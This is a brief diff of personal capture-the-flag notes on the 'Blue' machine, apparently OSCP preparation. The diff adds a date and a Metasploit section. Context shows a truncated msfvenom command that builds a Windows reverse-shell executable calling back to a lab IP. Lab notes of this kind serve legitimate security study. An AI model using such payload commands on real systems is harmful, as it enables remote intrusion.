@@ -1,9 +1,7 @@
 # Blue
 Name: Blue
-Date:  
+Date:  22/09/2022 - With Metasploit &
 Difficulty:  Easy
-Description:  
-Better Description:  
 Goals:  OSCP Prep, rewrite a python exploit
 Learnt:
 
@@ -52,4 +50,8 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.129.105.18 LPORT=4444 -f exe -o s
 
 ## PrivEsc
 
-      
+## Metapsploit
+Just for sake of completion
+![](metasploit.png)
+
+
